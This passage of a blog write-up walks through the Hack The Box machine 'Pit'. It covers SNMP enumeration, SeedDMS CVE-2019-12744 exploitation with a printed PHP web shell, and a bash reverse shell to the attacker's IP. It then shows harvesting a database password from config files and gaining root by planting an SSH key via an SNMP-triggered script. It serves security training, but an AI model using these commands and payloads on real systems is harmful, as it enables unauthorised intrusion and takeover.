</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.17 <span class="o">=</span> STRING: staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.18 <span class="o">=</span> STRING: sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.19 <span class="o">=</span> STRING: system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.20 <span class="o">=</span> STRING: unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.21 <span class="o">=</span> STRING: user_u          user       s0         s0                             user_r
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.22 <span class="o">=</span> STRING: xguest_u        user       s0         s0                             xguest_r
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.23 <span class="o">=</span> STRING: login
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.24 <span class="o">=</span> STRING: 
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.25 <span class="o">=</span> STRING: Login Name           SELinux User         MLS/MCS Range        Service
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.26 <span class="o">=</span> STRING: 
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.27 <span class="o">=</span> STRING: __default__          unconfined_u         s0-s0:c0.c1023       *
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.28 <span class="o">=</span> STRING: michelle             user_u               s0                   *
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.29 <span class="o">=</span> STRING: root                 unconfined_u         s0-s0:c0.c1023       *
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.30 <span class="o">=</span> STRING: System uptime
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.31 <span class="o">=</span> STRING:  14:03:52 up 12:03,  <span class="m">0</span> users,  load average: 0.04, 0.01, 0.00
</span></span><span class="line"><span class="cl">NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class="s2">&#34;monitoring&#34;</span>.31 <span class="o">=</span> No more variables left in this MIB View <span class="o">(</span>It is past the end of the MIB tree<span class="o">)</span>
</span></span></code></pre></div><p>I will also notice that some of the output lines starting with <code>NET-SNMP-EXTEND-MIB</code> are similar to the output from some Linux command utilities such as <code>uptime</code> and <code>free -h</code>.</p>
<h3 id="seeddms-tcp-80">SeedDMS (TCP 80)</h3>
<p>From the enumeration above, a web directory was revealed at <code>/var/www/html/seeddms51x/seeddms</code> by <code>snmpwalk</code>. Since the directory path contains a &ldquo;dms&rdquo; string, I tried to append the path name to <code>http://dms-pit.htb</code>.</p>
<p>And then when I enter <code>http://dms-pit.htb/seeddms51x/seeddms</code>, it redirects me to a login page.</p>
<p><div class="img-container"><img src="imgs/image-20210521014642036.png" alt="image-20210521014642036"  /></div>
</p>
<p>A quick search for &ldquo;SeedDMS&rdquo; on Google pops <a href="https://www.seeddms.org/index.php?id=2">this link</a>. It states that SeedDMS is:</p>
<blockquote>
<p>A free document management system with an easy to use web  based user interface for small and medium sized enterprises. It is based on PHP and MySQL or sqlite3 and runs on Linux, MacOS and Windows. Many  years of development has made it a mature, powerful and enterprise ready platform for sharing and storing documents.</p>
</blockquote>
<h4 id="gobuster">Gobuster</h4>
<p>This time <code>gobuster</code> reveals some accessible items.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «pit» «10.10.14.49»
</span></span><span class="line"><span class="cl">$ gobuster dir -u http://dms-pit.htb/seeddms51x/seeddms/ -x txt,php -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -o gobuster/dms-pit.htb-seeddms-M-80 -t <span class="m">10</span> -b 403,404 -r
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">Gobuster v3.1.0
</span></span><span class="line"><span class="cl">by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Url:                     http://dms-pit.htb/seeddms51x/seeddms/
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Method:                  GET
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Threads:                 <span class="m">10</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Negative Status codes:   403,404
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> User Agent:              gobuster/3.1.0
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Extensions:              txt,php
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Follow Redirect:         <span class="nb">true</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Timeout:                 <span class="nv">10s</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">2021/05/20 15:13:54 Starting gobuster in directory enumeration <span class="nv">mode</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">/index.php            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 7359<span class="o">]</span>
</span></span><span class="line"><span class="cl">/CHANGELOG            <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 101652<span class="o">]</span>
</span></span><span class="line"><span class="cl">/LICENSE              <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 18321<span class="o">]</span>
</span></span><span class="line"><span class="cl">/TODO                 <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 2844<span class="o">]</span>
</span></span><span class="line"><span class="cl">/Guests.php           <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 173<span class="o">]</span>
</span></span><span class="line"><span class="cl">/GuideImages.php      <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 173<span class="o">]</span>
</span></span><span class="line"><span class="cl">/HB.php               <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 173<span class="o">]</span>
</span></span><span class="line"><span class="cl">/HDRS.php             <span class="o">(</span>Status: 502<span class="o">)</span> <span class="o">[</span>Size: 173<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span><span class="line"><span class="cl">2021/05/20 15:22:45 <span class="nv">Finished</span>
</span></span><span class="line"><span class="cl"><span class="o">===============================================================</span>
</span></span></code></pre></div><p>Poking <code>/CHANGELOG</code> with curl reveals the software version.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «pit» «10.10.14.49» 
</span></span><span class="line"><span class="cl">$ curl -s http://dms-pit.htb/seeddms51x/seeddms/CHANGELOG  <span class="p">|</span> head 
</span></span><span class="line"><span class="cl">--------------------------------------------------------------------------------
</span></span><span class="line"><span class="cl">                     Changes in version 5.1.15
</span></span><span class="line"><span class="cl">--------------------------------------------------------------------------------
</span></span><span class="line"><span class="cl">- Improved import from file system
</span></span><span class="line"><span class="cl">- HTTP Proxy <span class="k">for</span> access on external extension repository can be <span class="nb">set</span>
</span></span><span class="line"><span class="cl">- Do not use unzip in ExtensionMgr anymore
</span></span><span class="line"><span class="cl">- fix version compare on info page
</span></span><span class="line"><span class="cl">- allow one page mode on search page
</span></span><span class="line"><span class="cl">- fix import of older extension versions from repository
</span></span></code></pre></div><h4 id="searchsploit-1">Searchsploit</h4>
<p>I feed the version to <code>searchsploit</code>, and it returns with some potential exploits. There is one for RCE.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «pit» «10.10.14.49»
</span></span><span class="line"><span class="cl">$ searchsploit seeddms
</span></span><span class="line"><span class="cl">--------------------------------------------------------------------------- ---------------------------------
</span></span><span class="line"><span class="cl"> Exploit Title                                                             <span class="p">|</span>  Path
</span></span><span class="line"><span class="cl">--------------------------------------------------------------------------- ---------------------------------
</span></span><span class="line"><span class="cl">SeedDMS 5.1.18 - Persistent Cross-Site Scripting                           <span class="p">|</span> php/webapps/48324.txt
</span></span><span class="line"><span class="cl">SeedDMS &lt; 5.1.11 - <span class="s1">&#39;out.GroupMgr.php&#39;</span> Cross-Site Scripting                 <span class="p">|</span> php/webapps/47024.txt
</span></span><span class="line"><span class="cl">SeedDMS &lt; 5.1.11 - <span class="s1">&#39;out.UsrMgr.php&#39;</span> Cross-Site Scripting                   <span class="p">|</span> php/webapps/47023.txt
</span></span><span class="line"><span class="cl">SeedDMS versions &lt; 5.1.11 - Remote Command Execution                       <span class="p">|</span> php/webapps/47022.txt
</span></span><span class="line"><span class="cl">--------------------------------------------------------------------------- ---------------------------------
</span></span></code></pre></div><p>The exploitation steps for the RCE vulnerability is as follow:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="err">Exploit Title: [Remote Command Execution through Unvalidated File Upload in SeedDMS versions &lt;5.1.11]
</span></span></span><span class="line"><span class="cl"><span class="err"># Google Dork: [NA]
</span></span></span><span class="line"><span class="cl"><span class="err"># Date: [20-June-2019]
</span></span></span><span class="line"><span class="cl"><span class="err"># Exploit Author: [Nimit Jain](https://www.linkedin.com/in/nimitiitk)(https://secfolks.blogspot.com)
</span></span></span><span class="line"><span class="cl"><span class="err"># Vendor Homepage: [https://www.seeddms.org]
</span></span></span><span class="line"><span class="cl"><span class="err"># Software Link: [https://sourceforge.net/projects/seeddms/files/]
</span></span></span><span class="line"><span class="cl"><span class="err"># Version: [SeedDMS versions &lt;5.1.11] (REQUIRED)
</span></span></span><span class="line"><span class="cl"><span class="err"># Tested on: [NA]
</span></span></span><span class="line"><span class="cl"><span class="err"># CVE : [CVE-2019-12744]
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">Exploit Steps:
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">Step 1: Login to the application and under any folder add a document.
</span></span></span><span class="line"><span class="cl"><span class="err">Step 2: Choose the document as a simple php backdoor file or any backdoor/webshell could be used.
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">PHP Backdoor Code: 
</span></span></span><span class="line"><span class="cl"><span class="err">&lt;?php
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">if(isset($_REQUEST[&#39;cmd&#39;])){
</span></span></span><span class="line"><span class="cl"><span class="err">        echo &#34;&lt;pre&gt;&#34;;
</span></span></span><span class="line"><span class="cl"><span class="err">        $cmd = ($_REQUEST[&#39;cmd&#39;]);
</span></span></span><span class="line"><span class="cl"><span class="err">        system($cmd);
</span></span></span><span class="line"><span class="cl"><span class="err">        echo &#34;&lt;/pre&gt;&#34;;
</span></span></span><span class="line"><span class="cl"><span class="err">        die;
</span></span></span><span class="line"><span class="cl"><span class="err">}
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">?&gt;
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">Step 3: Now after uploading the file check the document id corresponding to the document.
</span></span></span><span class="line"><span class="cl"><span class="err">Step 4: Now go to example.com/data/1048576/&#34;document_id&#34;/1.php?cmd=cat+/etc/passwd to get the command response in browser.
</span></span></span><span class="line"><span class="cl"><span class="err">
</span></span></span><span class="line"><span class="cl"><span class="err">Note: Here &#34;data&#34; and &#34;1048576&#34; are default folders where the uploaded files are getting saved.
</span></span></span></code></pre></div><p>I will need a valid credentials for RCE.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-nginx">Shell as nginx</h3>
<h4 id="seeddms-dashboard">SeedDMS Dashboard</h4>
<p><code>admin:admin</code> are the default credentials for SeedDMS.</p>
<p><div class="img-container"><img src="imgs/image-20210521014957029.png" alt="image-20210521014957029"  /></div>
</p>
<p>But these creds didn&rsquo;t work here, so I submit <code>michelle:michelle</code>, and it logs me in 😮 !</p>
<p><div class="img-container"><img src="imgs/image-20210521023728548.png" alt="image-20210521023728548"  /></div>
</p>
<h4 id="seeddms-cve-2019-12744">SeedDMS CVE-2019-12744</h4>
<p>With a valid account, I can try to reproduce the exploitation steps for remote code execution.</p>
<p>First, I will create a document by navigating to <code>Docs &gt; Users &gt; Michelle</code> (folders), and then under <code>michelle</code> folder I will add a new document.</p>
<p><div class="img-container"><img src="imgs/image-20210521025006867.png" alt="image-20210521025006867"  /></div>
</p>
<p>On the local file menu, I will browse and upload my PHP web shell.</p>
<p><div class="img-container"><img src="imgs/image-20210521025924716.png" alt="image-20210521025924716"  /></div>
</p>
<p>And the file gets uploaded.</p>
<p><div class="img-container"><img src="imgs/image-20210521030038234.png" alt="image-20210521030038234"  /></div>
</p>
<p>According to the exploit author, the uploaded web shell should be available at  <code>http://dms-pit.htb/seeddms51x/seeddms/data/1048576/63/1.php?f=id</code>, where <code>63</code> is my document ID, but I couldn&rsquo;t find it there.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «pit» «10.10.14.49»
</span></span><span class="line"><span class="cl">$ curl -s <span class="s1">&#39;http://dms-pit.htb/seeddms51x/seeddms/data/1048576/63/1.php?f=id&#39;</span>
</span></span><span class="line"><span class="cl">File not found.
</span></span></code></pre></div><p>The web server somehow has a weird routing, so I downloaded the SeedDMS source code to figure out its folder structure, and it was on <code>http://dms-pit.htb/seeddms51x/data/1048576/64/1.php?f=id</code>!</p>
<p><div class="img-container"><img src="imgs/image-20210521031346742.png" alt="image-20210521031346742"  /></div>
</p>
<h4 id="reverse-shell">Reverse Shell</h4>
<p>I will send a bash reverse shell to get a foothold on the box.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">/bin/bash -c <span class="s2">&#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.49/53 0&gt;&amp;1&#34;</span>
</span></span></code></pre></div><p>On my listener:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.49»
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">53</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">53</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.49<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.241<span class="o">]</span> <span class="m">58888</span>
</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>26319<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
</span></span><span class="line"><span class="cl">bash: no job control in this shell
</span></span><span class="line"><span class="cl">bash-4.4$ id
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>992<span class="o">(</span>nginx<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>988<span class="o">(</span>nginx<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>988<span class="o">(</span>nginx<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>system_u:system_r:httpd_t:s0
</span></span></code></pre></div><p>&gt;&gt; I just read and watched other writeups, and they were unable to get a foothold. Not sure why, but I did.</p>
<p><div class="img-container"><img src="imgs/image-20210521034126889.png" alt="image-20210521034126889"  /></div>
</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-michelle">Shell as michelle</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>Searching for string &ldquo;pass&rdquo; under <code>/var/www/html/seeddms51x/conf</code> reveals the database credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bash-4.4$ <span class="nb">pwd</span>
</span></span><span class="line"><span class="cl"><span class="nb">pwd</span>
</span></span><span class="line"><span class="cl">/var/www/html/seeddms51x/conf
</span></span><span class="line"><span class="cl">bash-4.4$  grep -Ri <span class="s2">&#34;pass&#34;</span>
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">settings.xml:    &lt;database <span class="nv">dbDriver</span><span class="o">=</span><span class="s2">&#34;mysql&#34;</span> <span class="nv">dbHostname</span><span class="o">=</span><span class="s2">&#34;localhost&#34;</span> <span class="nv">dbDatabase</span><span class="o">=</span><span class="s2">&#34;seeddms&#34;</span> <span class="nv">dbUser</span><span class="o">=</span><span class="s2">&#34;seeddms&#34;</span> <span class="nv">dbPass</span><span class="o">=</span><span class="s2">&#34;ied^ieY6xoquu&#34;</span> <span class="nv">doNotCheckVersion</span><span class="o">=</span><span class="s2">&#34;false&#34;</span>&gt;
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p>Under <code>/var/www/html/seeddms51x/data/conf</code> there is also another database credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bash-4.4$ <span class="nb">pwd</span>
</span></span><span class="line"><span class="cl"><span class="nb">pwd</span>
</span></span><span class="line"><span class="cl">/var/www/html/seeddms51x/data/conf
</span></span><span class="line"><span class="cl">bash-4.4$ grep -Ri pass
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span><span class="line"><span class="cl">settings.xml:    &lt;database <span class="nv">dbDriver</span><span class="o">=</span><span class="s2">&#34;sqlite&#34;</span> <span class="nv">dbHostname</span><span class="o">=</span><span class="s2">&#34;localhost&#34;</span> <span class="nv">dbDatabase</span><span class="o">=</span><span class="s2">&#34;/home/www-data/seeddms51x/data/content.db&#34;</span> <span class="nv">dbUser</span><span class="o">=</span><span class="s2">&#34;seeddms&#34;</span> <span class="nv">dbPass</span><span class="o">=</span><span class="s2">&#34;seeddms&#34;</span> <span class="nv">doNotCheckVersion</span><span class="o">=</span><span class="s2">&#34;false&#34;</span>&gt;
</span></span><span class="line"><span class="cl">...<span class="o">[</span>SNIP<span class="o">]</span>...
</span></span></code></pre></div><p>The password <code>ied^ieY6xoquu</code> is the one that valid, but I didn&rsquo;t find anything juicy in the database.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">bash-4.4$ mysql seeddms -u seeddms -pied^ieY6xoquu -e <span class="s1">&#39;show databases;&#39;</span>
</span></span><span class="line"><span class="cl">mysql seeddms -u seeddms -pied^ieY6xoquu -e <span class="s1">&#39;show databases;&#39;</span>
</span></span><span class="line"><span class="cl">Database
</span></span><span class="line"><span class="cl">information_schema
</span></span><span class="line"><span class="cl">seeddms
</span></span></code></pre></div><h4 id="cockpit-tcp-9090">Cockpit (TCP 9090)</h4>
<p>Using <code>Michelle:ied^ieY6xoquu</code> on the Cockpit login page at <code>https://pit.htb:9090</code> logs me in.</p>
<p><div class="img-container"><img src="imgs/image-20210521063658472.png" alt="image-20210521063658472"  /></div>
</p>
<p>Cockpit gives terminal access through its web interface to interact with the system. I couldn&rsquo;t get my reverse shell/SSH to work because of SELinux, so I will just use this terminal and grab the user flag.</p>
<p><div class="img-container"><img src="imgs/image-20210521064953236.png" alt="image-20210521064953236"  /></div>
</p>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-2">Enumeration</h4>
<p>For the SNMP enumeration, I will remember <code>/usr/bin/monitoring</code>, which turned out to be a bash script.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>michelle@pit /<span class="o">]</span>$ cat /usr/bin/monitor
</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> script in /usr/local/monitoring/check*sh
</span></span><span class="line"><span class="cl"><span class="k">do</span>
</span></span><span class="line"><span class="cl">    /bin/bash <span class="nv">$script</span>
</span></span><span class="line"><span class="cl"><span class="k">done</span>
</span></span></code></pre></div><p>The script takes and executes other scripts under  <code>/usr/local/monitoring/</code> which filename begins with <code>check</code> and ends with <code>sh</code>  . If I try to list the content of that directory, it returns a permission denied error.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>michelle@pit /<span class="o">]</span>$ ls -l /usr/local/monitoring/
</span></span><span class="line"><span class="cl">ls: cannot open directory <span class="s1">&#39;/usr/local/monitoring/&#39;</span>: Permission denied
</span></span></code></pre></div><p>But with <code>-ld</code>, it shows that the folder has extended permission, and user <code>michelle</code> is allowed to write a file under that directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>michelle@pit /<span class="o">]</span>$ ls -ld /usr/local/monitoring/
</span></span><span class="line"><span class="cl">drwxrwx---+ <span class="m">2</span> root root <span class="m">122</span> May <span class="m">20</span> 20:35 /usr/local/monitoring/
</span></span><span class="line"><span class="cl"><span class="o">[</span>michelle@pit /<span class="o">]</span>$ getfacl /usr/local/monitoring/
</span></span><span class="line"><span class="cl">getfacl: Removing leading <span class="s1">&#39;/&#39;</span> from absolute path names
</span></span><span class="line"><span class="cl"><span class="c1"># file: usr/local/monitoring/</span>
</span></span><span class="line"><span class="cl"><span class="c1"># owner: root</span>
</span></span><span class="line"><span class="cl"><span class="c1"># group: root</span>
</span></span><span class="line"><span class="cl">user::rwx
</span></span><span class="line"><span class="cl">user:michelle:-wx
</span></span><span class="line"><span class="cl">group::rwx
</span></span><span class="line"><span class="cl">mask::rwx
</span></span><span class="line"><span class="cl">other::---
</span></span></code></pre></div><h4 id="from-snmp-to-rce">From SNMP to RCE</h4>
<p>From the SNMP enumeration, each time an SNMP &ldquo;walk&rdquo; is performed,  <code>usr/bin/monitor</code> will always pop up in the <code>NET-SNMP-EXTEND-MIB</code> section.</p>
<p><div class="img-container"><img src="imgs/image-20210521075856288.png" alt="image-20210521075856288"  /></div>
</p>
<p>Based on the output above, and the following  <a href="https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/deployment_guide/sect-system_monitoring_tools-net-snmp-extending">documentation</a>, there is a chance that when a SNMP walk is performed, the Net-SNMP agent will also execute <code>/usr/bin/monitor</code>.</p>
<p><div class="img-container"><img src="imgs/image-20211013161852076.png" alt="image-20211013161852076"  /></div>
</p>
<p>So, the strategy here is that I can try to write a script and save it under  <code>/usr/local/monitoring/</code>. Then I will do a SNMP walk to trigger the Net-SNMP agent to execute <code>/usr/bin/monitor</code> which will then eventually execute the script I created.</p>
<p>Now I will write a script to <code>/usr/local/monitoring/</code> that will inject my SSH public key to the root&rsquo;s authorized_keys file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="o">[</span>michelle@pit /<span class="o">]</span>$ <span class="nb">echo</span> -e <span class="s1">&#39;#!/bin/bash\nmkdir -p /root/.ssh/ 2&gt;/dev/null &amp;&amp; echo &#34;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPmWTx2r3W2mHnCnKmoJCnkrj6mXxSIGq3E5ks1g+moK&#34; &gt; /root/.ssh/authorized_keys&#39;</span> &gt; /usr/local/monitoring/check_iamf.sh
</span></span></code></pre></div><p>Then I will do another  SNMP walk and wait for it to finish, or at least get to the NET-SNMP-EXTEND-MIB output line.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «pit» «10.10.14.49»
</span></span><span class="line"><span class="cl">$ snmpwalk -v 2c -c public 10.10.10.241 internet
</span></span></code></pre></div><p>And now if I try to SSH login as root to Pit, it logs me in.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «pit» «10.10.14.49»
</span></span><span class="line"><span class="cl">$ ssh root@10.10.10.241
</span></span><span class="line"><span class="cl">Web console: https://pit.htb:9090/
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Last login: Thu May <span class="m">20</span> 21:12:44 <span class="m">2021</span> from 10.10.14.49
</span></span><span class="line"><span class="cl"><span class="o">[</span>root@pit ~<span class="o">]</span><span class="c1"># id</span>
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">context</span><span class="o">=</span>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
</span></span><span class="line"><span class="cl"><span class="o">[</span>root@pit ~<span class="o">]</span><span class="c1"># ls -l</span>
</span></span><span class="line"><span class="cl">total <span class="m">8</span>
</span></span><span class="line"><span class="cl">-rwx------. <span class="m">1</span> root root <span class="m">706</span> Apr <span class="m">22</span>  <span class="m">2020</span> cleanup.sh
</span></span><span class="line"><span class="cl">drwx------. <span class="m">2</span> root root <span class="m">122</span> Apr <span class="m">18</span>  <span class="m">2020</span> monitoring
</span></span><span class="line"><span class="cl">lrwxrwxrwx. <span class="m">1</span> root root   <span class="m">9</span> May <span class="m">10</span> 11:07 null -&gt; /dev/null
</span></span><span class="line"><span class="cl">-r--------. <span class="m">1</span> root root  <span class="m">33</span> May <span class="m">20</span> 02:00 root.txt
</span></span><span class="line"><span class="cl"><span class="o">[</span>root@pit ~<span class="o">]</span><span class="c1">#</span>
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210521081359037.png" alt="image-20210521081359037"  /></div>
</p>
<blockquote>
<p>Phew, I didn&rsquo;t expect this writeup to be this long. 😅🔨</p>
</blockquote>
]]></content:encoded>
    </item>
    
  </channel>
</rss>
